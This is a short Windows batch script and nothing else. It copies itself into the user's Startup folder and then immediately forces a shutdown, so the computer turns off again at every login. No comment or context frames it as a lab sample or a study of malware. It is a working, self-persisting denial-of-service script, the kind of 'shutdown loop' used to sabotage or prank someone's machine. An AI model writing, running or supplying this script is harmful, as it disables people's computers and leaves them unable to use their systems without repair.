set STARTUP=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup

copy "%~f0" "%STARTUP%"

shutdown /s /t 00
